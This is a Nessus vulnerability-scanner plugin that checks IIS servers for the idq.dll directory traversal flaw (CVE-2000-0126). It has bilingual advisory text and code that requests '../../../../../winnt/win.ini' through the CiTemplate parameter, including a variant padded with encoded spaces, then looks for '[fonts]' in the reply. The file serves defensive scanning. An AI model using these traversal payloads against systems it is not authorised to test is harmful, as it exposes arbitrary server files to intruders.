#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10115);
 script_bugtraq_id(968);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-0126");
 name["english"] = "idq.dll directory traversal";
 name["francais"] = "idq.dll directory traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
There is a vulnerability in idq.dll which allows any remote
user to read any file on the target system by doing the request :

	GET http://target/query.idq?CiTemplate=../../../somefile.ext
	

Solution : Microsoft's webhits.dll addresses some of this
           issue. It is available at :
	   http://www.microsoft.com/downloads/release/asp?ReleaseID=17727

Risk factor : High
Bugtraq ID : 968";

 desc["francais"] = "
Il existe une vulnérabilité dans idq.dll qui permet à n'importe quel
utilisateur de lire n'importe quel fichier  sur le site distant en
faisant la requete :

	GET http://target/query.idq?CiTemplate=../../../somefile.ext

Solution : webhits.dll, de Microsoft, corrige ce problème. Il est
           disponible à :
	   http://www.microsoft.com/downloads/release/asp?ReleaseID=17727

Facteur de risque : Elevé
Bugtraq ID : 968";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to read an arbitrary file";
 summary["francais"] = "Essaye de lire un fichier arbitraire";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);


sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);


if(get_port_state(port))
{
 
 base = "/query.idq?CiTemplate=../../../../../winnt/win.ini";

 req1 = http_get(item:base, port:port);
 req2 = http_get(item:string(base, crap(data:"%20", length:300)), port:port);


  r = http_keepalive_send_recv(port:port, data:req1);
  if ( ! r ) exit(0);
  if("[fonts]" >< r)
  {
   security_hole(port);
   exit(0);
  }
  r2 = http_keepalive_send_recv(port:port, data:req2);
  if("[fonts]" >< r2)
  {
   security_hole(port);
   exit(0);
  }
}
